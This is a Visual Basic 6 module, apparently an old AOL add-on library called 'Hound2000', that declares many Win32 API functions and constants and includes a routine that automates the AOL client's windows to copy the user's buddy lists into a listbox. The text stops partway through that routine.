Attribute VB_Name = "Hound2000"
'Questions, bugs, comments?
'Hound_Dog@Juno.Com

'Do not change any subs/functions in this bas file
'if you feel the need to change anything to work
'with another bas then copy and paste the sub/function
'into a different module, and leave this code intact

Option Explicit
Public Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MEMORYSTATUS)
Public Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Public Declare Function StretchBlt Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal nSrcWidth As Long, ByVal nSrcHeight As Long, ByVal dwRop As Long) As Long
Public Declare Function mciGetErrorString Lib "winmm.dll" Alias "mciGetErrorStringA" (ByVal dwError As Long, ByVal lpstrBuffer As String, ByVal uLength As Long) As Long
Public Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function ExitWindows Lib "user32" Alias "ExitWindowsEx" (ByVal dwOptions As Long, ByVal dwReserved As Long) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Any, phkResult As Long, lpdwDisposition As Long) As Long
Public Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpVlueName As String, ByVal reserved As Long, dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Public Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Public Declare Function GetPrivateProfileSection Lib "kernel32" Alias "GetPrivateProfileSectionA" (ByVal lpAppname As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function WritePrivateProfileSection Lib "kernel32" Alias "WritePrivateProfileSectionA" (ByVal lpAppname As String, ByVal lpString As String, ByVal lpFileName As String) As Long
Public Declare Function BringWindowToTop Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal fEnable As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function WindowFromPointXY Lib "user32" Alias "WindowFromPoint" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Public Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Public Declare Function RegisterClipboardFormat Lib "user32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long
Public Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function Beep Lib "kernel32" (ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function GetPixel Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function GetClientRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Public Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function ScreenToClient Lib "user32" (ByVal hwnd As Long, lpPoint As POINTAPI) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Public Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Public Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Public Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Public Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Public Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function SetMenuItemBitmaps Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal hBitmapUnchecked As Long, ByVal hBitmapChecked As Long) As Long
Public Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Public Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Public Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Public Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Public Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Public Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
Public Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, _
    ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, _
    ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, _
    ByVal ySrc As Long, ByVal dwRop As Long) As Long
Public Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Public Declare Function CreatePopupMenu Lib "user32" () As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function GetDesktopWindow Lib "user32" () As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function SetPixel Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long, ByVal crColor As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Public Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Public Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Public Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Public Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Public Declare Function DestroyMenu Lib "user32" (ByVal hMenu&) As Integer
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function GetModuleFileNameA Lib "kernel32" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
Public Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, _
    ByVal hdc As Long) As Long

Public ProcessArray() As String
Public SizeOfPA As Integer
Public ProcessNoGo As Boolean

Public Const GWL_WNDPROC = -4

Public Const SND_SYNC = &H0
Public Const SND_ASYNC = &H1
Public Const SND_NODEFAULT = &H2
Public Const SND_MEMORY = &H4
Public Const SND_ALIAS = &H10000
Public Const SND_FILENAME = &H20000
Public Const SND_RESOURCE = &H40004
Public Const SND_ALIAS_ID = &H110000
Public Const SND_ALIAS_START = 0
Public Const SND_LOOP = &H8
Public Const SND_NOSTOP = &H10
Public Const SND_VALID = &H1F
Public Const SND_NOWAIT = &H2000
Public Const SND_VALIDFLAGS = &H17201F
Public Const SND_RESERVED = &HFF000000
Public Const SND_TYPE_MASK = &H170007


Public Const WM_CHAR = &H102
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203

Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3
Public Const EM_GETLINE = &HC4

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const RGN_AND = 1
Public Const RGN_COPY = 5
Public Const RGN_DIFF = 4
Public Const RGN_OR = 2
Public Const RGN_XOR = 3

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9
Public Const VK_UP = &H26

Public Const EWX_FORCE = 4
Public Const EWX_LOGOFF = 0
Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1
    
Public Const HWND_TOP = 0
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_OWNER = 4

Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)

Public Const PROCESS_VM_READ = &H10
Public Const STANDARD_RIGHTS_REQUIRED = &HF0000
Public Const WM_NCMOUSEMOVE = &HA0
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const WM_NCLBUTTONUP = &HA2

Public Const SRCCOPY = &HCC0020
Public Const SRCAND = &H8800C6
Public Const SRCINVERT = &H660046
Public Const SRCPAINT = &HEE0086
Public Const SRCERASE = &H4400328
Public Const WHITENESS = &HFF0062
Public Const BLACKNESS = &H42

Public Const HTERROR = (-2)
Public Const HTTRANSPARENT = (-1)
Public Const HTNOWHERE = 0
Public Const HTCLIENT = 1
Public Const HTCAPTION = 2
Public Const HTSYSMENU = 3
Public Const HTGROWBOX = 4
Public Const HTSIZE = HTGROWBOX
Public Const HTMENU = 5
Public Const HTHSCROLL = 6
Public Const HTVSCROLL = 7
Public Const HTMINBUTTON = 8
Public Const HTMAXBUTTON = 9
Public Const HTLEFT = 10
Public Const HTRIGHT = 11
Public Const HTTOP = 12
Public Const HTTOPLEFT = 13
Public Const HTTOPRIGHT = 14
Public Const HTBOTTOM = 15
Public Const HTBOTTOMLEFT = 16
Public Const HTBOTTOMRIGHT = 17
Public Const HTBORDER = 18
Public Const HTREDUCE = HTMINBUTTON
Public Const HTZOOM = HTMAXBUTTON
Public Const HTSIZEFIRST = HTLEFT
Public Const HTSIZELAST = HTBOTTOMRIGHT
Public Const Plug = "Hound2K"
Public GiveClsNam As Long

Public IgnoreStat As Boolean
Public UnIgnoreStat As Boolean
Public Const blue = "0000FF"
Public Const LBlue = "#33CCFF"
Public Const DBlue = "#000088"
Public Const green = "#00CC00"
Public Const LGreen = "#00FF00"
Public Const DGreen = "#006600"
Public Const red = "#FF0000"
Public Const DRed = "#AA0000"
Public Const Yellow = "#FFFF00"
Public Const Grey = "#BBBBBB"
Public Const LGrey = "#DDDDDD"
Public Const DGrey = "#999999"
Public Const Orange = "FF9900"
Public Const Purple = "CC33CC"
Public Const Pink = "#FF6699"

'REGISTRY CONSTANTS
Public Const REG_SZ = 1
Public Const HKEY_CURRENT_USER = &H80000001
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const REG_OPTION_NON_VOLATILE = 0
Public Const SYNCHRONIZE = &H100000
Public Const STANDARD_RIGHTS_ALL = &H1F0000
Public Const KEY_QUERY_VALUE = &H1
Public Const KEY_SET_VALUE = &H2
Public Const KEY_CREATE_SUB_KEY = &H4
Public Const KEY_ENUMERATE_SUB_KEYS = &H8
Public Const KEY_NOTIFY = &H10
Public Const KEY_CREATE_LINK = &H20
Public Const ERROR_SUCCESS = 0&
Public Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) And (Not SYNCHRONIZE))

Public Const CLR_MENUBAR = &H80000004
Public Const Number_of_Menu_Selections = 3
        
Public Const WM_SYSCOMMAND = &H112
Public Const SC_MOVE = &HF012
Public Const WA_INACTIVE = 0
Public Const WA_ACTIVE = 1
Public Const WA_CLICKACTIVE = 2
Public Const WM_SETFOCUS = &H7
Public Const WM_KILLFOCUS = &H8
Public Const WM_ENABLE = &HA
Public Const WM_SETREDRAW = &HB


Public Const WM_PAINT = &HF

Public Const WM_QUERYENDSESSION = &H11
Public Const WM_QUIT = &H12
Public Const WM_QUERYOPEN = &H13
Public Const WM_ERASEBKGND = &H14
Public Const WM_SYSCOLORCHANGE = &H15
Public Const WM_ENDSESSION = &H16
Public Const WM_SHOWWINDOW = &H18
Public Const WM_WININICHANGE = &H1A
Public Const WM_DEVMODECHANGE = &H1B
Public Const WM_ACTIVATEAPP = &H1C
Public Const WM_FONTCHANGE = &H1D
Public Const WM_TIMECHANGE = &H1E
Public Const WM_CANCELMODE = &H1F
Public Const WM_SETCURSOR = &H20
Public Const WM_MOUSEACTIVATE = &H21
Public Const WM_CHILDACTIVATE = &H22
Public Const WM_QUEUESYNC = &H23
Public Const WM_GETMINMAXINFO = &H24
Public Const WM_PAINTICON = &H26
Public Const WM_ICONERASEBKGND = &H27
Public Const WM_NEXTDLGCTL = &H28
Public Const WM_SPOOLERSTATUS = &H2A
Public Const WM_DRAWITEM = &H2B
Public Const WM_MEASUREITEM = &H2C
Public Const WM_DELETEITEM = &H2D
Public Const WM_VKEYTOITEM = &H2E
Public Const WM_CHARTOITEM = &H2F
Public Const WM_SETFONT = &H30
Public Const WM_GETFONT = &H31
Public Const WM_SETHOTKEY = &H32
Public Const WM_GETHOTKEY = &H33
Public Const WM_QUERYDRAGICON = &H37
Public Const WM_COMPAREITEM = &H39
Public Const WM_COMPACTING = &H41

Public Const CN_RECEIVE = &H1
Public Const CN_TRANSMIT = &H2
Public Const CN_EVENT = &H4

Public Const WM_WINDOWPOSCHANGING = &H46
Public Const WM_WINDOWPOSCHANGED = &H47
Public Const WM_POWER = &H48



Type COPYDATASTRUCT
    dwData As Long
    cbData As Long
    lpData As Long
End Type

    Public Const WM_NCCREATE = &H81
    Public Const WM_NCDESTROY = &H82
    Public Const WM_NCCALCSIZE = &H83
    Public Const WM_NCHITTEST = &H84
    Public Const WM_NCPAINT = &H85
    Public Const WM_NCACTIVATE = &H86
    Public Const WM_GETDLGCODE = &H87
  
    Public Const FF = &H255
    Public Const AA = &H170
    Public Const BB = &H187
    Public Const CC = &H204
    Public Const DD = &H221
    Public Const EE = &H238
    
    Public Const WM_NCLBUTTONDBLCLK = &HA3
    Public Const WM_NCRBUTTONDOWN = &HA4
    Public Const WM_NCRBUTTONUP = &HA5
    Public Const WM_NCRBUTTONDBLCLK = &HA6
    Public Const WM_NCMBUTTONDOWN = &HA7
    Public Const WM_NCMBUTTONUP = &HA8
    Public Const WM_NCMBUTTONDBLCLK = &HA9
    Public Const WM_KEYFIRST = &H100
  
    
    Public Const WM_DEADCHAR = &H103
    Public Const WM_SYSKEYDOWN = &H104
    Public Const WM_SYSKEYUP = &H105
    Public Const WM_SYSCHAR = &H106
    Public Const WM_SYSDEADCHAR = &H107
    Public Const WM_KEYLAST = &H108
    Public Const WM_INITDIALOG = &H110
  
    
    Public Const WM_TIMER = &H113
    Public Const WM_HSCROLL = &H114
    Public Const WM_VSCROLL = &H115
    Public Const WM_INITMENU = &H116
    Public Const WM_INITMENUPOPUP = &H117
    Public Const WM_MENUSELECT = &H11F
    Public Const WM_MENUCHAR = &H120
    Public Const WM_ENTERIDLE = &H121
    Public Const WM_CTLCOLORMSGBOX = &H132
    Public Const WM_CTLCOLOREDIT = &H133
    Public Const WM_CTLCOLORLISTBOX = &H134
    Public Const WM_CTLCOLORBTN = &H135
    Public Const WM_CTLCOLORDLG = &H136
    Public Const WM_CTLCOLORSCROLLBAR = &H137
    Public Const WM_CTLCOLORSTATIC = &H138
    Public Const WM_MOUSEFIRST = &H200
    Public Const WM_MOUSEMOVE = &H200
    Public Const WM_RBUTTONDOWN = &H204
    Public Const WM_RBUTTONUP = &H205
    Public Const WM_RBUTTONDBLCLK = &H206
    Public Const WM_MBUTTONDOWN = &H207
    Public Const WM_MBUTTONUP = &H208
    Public Const WM_MBUTTONDBLCLK = &H209
    Public Const WM_MOUSELAST = &H209
    Public Const WM_PARENTNOTIFY = &H210
    Public Const WM_ENTERMENULOOP = &H211
    Public Const WM_EXITMENULOOP = &H212
    Public Const WM_MDICREATE = &H220
    Public Const WM_MDIDESTROY = &H221
    Public Const WM_MDIACTIVATE = &H222
    Public Const WM_MDIRESTORE = &H223
    Public Const WM_MDINEXT = &H224
    Public Const WM_MDIMAXIMIZE = &H225
    Public Const WM_MDITILE = &H226
    Public Const WM_MDICASCADE = &H227
    Public Const WM_MDIICONARRANGE = &H228
    Public Const WM_MDIGETACTIVE = &H229
    Public Const WM_MDISETMENU = &H230
    Public Const WM_DROPFILES = &H233
    Public Const WM_MDIREFRESHMENU = &H234
    Public Const WM_CUT = &H300
    Public Const WM_COPY = &H301
    Public Const WM_PASTE = &H302
    Public Const WM_UNDO = &H304
    Public Const WM_RENDERFORMAT = &H305
    Public Const WM_RENDERALLFORMATS = &H306
    Public Const WM_DESTROYCLIPBOARD = &H307
    Public Const WM_DRAWCLIPBOARD = &H308
    Public Const WM_PAINTCLIPBOARD = &H309
    Public Const WM_VSCROLLCLIPBOARD = &H30A
    Public Const WM_SIZECLIPBOARD = &H30B
    Public Const WM_ASKCBFORMATNAME = &H30C
    Public Const WM_CHANGECBCHAIN = &H30D
    Public Const WM_HSCROLLCLIPBOARD = &H30E
    Public Const WM_QUERYNEWPALETTE = &H30F
    Public Const WM_PALETTEISCHANGING = &H310
    Public Const WM_PALETTECHANGED = &H311
    Public Const WM_HOTKEY = &H312
    Public Const WM_PENWINFIRST = &H380
    Public Const WM_PENWINLAST = &H38F
    Public Const WM_CHATGET = &H3606
  
    
Public Const WM_NULL = &H0
Public Const WM_CREATE = &H1
Public Const WM_MOVE = &H3
Public Const WM_SIZE = &H5
Public Const WM_ACTIVATE = &H6

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type MEMORYSTATUS
        dwLength As Long
        dwMemoryLoad As Long
        dwTotalPhys As Long
        dwAvailPhys As Long
        dwTotalPageFile As Long
        dwAvailPageFile As Long
        dwTotalVirtual As Long
        dwAvailVirtual As Long
End Type

Type POINTAPI
   X As Long
   Y As Long
End Type
Function BinaryFromDecimal(decNum As Integer)

End Function

Sub BuddyListGet(BLis As ListBox)
On Error Resume Next
Dim aol As Long, mdi As Long, Tit As Long, LisB As Long, _
Cat As String, tlen As Long, CatNum As Integer, CNum As Integer, _
icona As Long, IconB As Long, Tit2 As Long, _
cn As Integer, Lis1 As Long, i As Integer, chil As Long
Dim ctitl As String, X As Integer, Chld As Long
cn = 0
Do: DoEvents
aol& = FindWindow("AOL Frame25", vbNullString)
mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
chil& = FindWindowEx(mdi&, 0&, "AOL Child", vbNullString)
Tit& = FindChildByTitle(mdi&, chil&, "Buddy List Window")
Lis1& = FindWindowEx(Tit&, 0&, "_AOL_Listbox", vbNullString)
    If Tit& = 0 Then 'makes sure Buddy List Window
        Call RunAOLMenu(10, 8) 'is up
        Wait (0.3)
    End If
If Tit& <> 0 And Lis1& <> 0 Then Exit Do
Loop
Call ReadProcess2Array(Lis1&)

                For i = 0 To SizeOfPA
                   If InStr(ProcessArray(i), "(") <> 0 And InStr(ProcessArray(i), "/") <> 0 Then
                   cn = Val(cn) + 1
                   End If
                Next i

icona& = FindWindowEx(Tit&, 0&, "_AOL_Icon", vbNullString)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)
    icona& = GetWindow(icona&, GW_HWNDNEXT)

    Call ClickButton(icona&)

Do: DoEvents
Tit2& = FindChildByTitle(mdi&, chil&, "'s buddy list")
IconB& = FindWindowEx(Tit2&, 0&, "_AOL_Icon", vbNullString)
If Tit2& <> 0 And IconB& <> 0 Then Exit Do
Loop

    IconB& = GetWindow(IconB&, GW_HWNDNEXT)
                                    
    Call ClickButton(IconB&)
    Dim Crt As Long, Comb As Long, Clb As Long
Do: DoEvents
Crt& = FindChildByTitle(mdi&, chil&, "Edit List")
Comb& = FindWindowEx(Crt&, 0&, "_AOL_Combobox", vbNullString)
Clb& = FindWindowEx(Crt&, 0&, "_AOL_Listbox", vbNullString)
If Clb& <> 0 And Comb& <> 0 And Crt& <> 0 Then Exit Do
Loop
Dim c As Integer, l As Integer, LNum As Integer, _
lnm As Integer, st As String, Ll As Long, _
Wlen As Long, strin As String, titl As Long, Fin As String
Dim chk As Integer, chks As String



For X = 0 To cn - 1
    Wait (0.2)
      Wlen& = GetWindowTextLength(Crt&)
      strin$ = String$(100, 0)
      titl& = GetWindowText(Crt&, strin$, (Wlen& + 1))
      Fin$ = CStr(strin$)

       ctitl = (RTrim(LTrim(Mid(Fin$, 11, Len(Fin$)))))
       BLis.AddItem "__" & ctitl
            Call ReadProcess2Array(Clb&)
                For i = 0 To SizeOfPA
                    BLis.AddItem ProcessArray(i)
                Next i

    Call SendMessage(Comb&, WM_RBUTTONDBLCLK, 0, 0&)
        
    Call SendMessageByNum(Comb&, WM_KEYDOWN, VK_RIGHT, 0)
    Call SendMessageByNum(Comb&, WM_KEYUP, VK_RIGHT, 0)
    Dim ctitl2 As String
    Do: DoEvents
      Wlen& = GetWindowTextLength(Crt&)
      strin$ = String$(100, 0)
      titl& = GetWindowText(Crt&, strin$, (Wlen& + 1))
      Fin$ = CStr(strin$)
      
      If Not Fin$ = ctitl Then Exit Do
      Loop
      Wait (0.5)
Next X
Call SendMessage(Tit2&, WM_CLOSE, 0, 0&)
Wait (0.2)
Call SendMessage(Crt&, WM_CLOSE, 0, 0&)
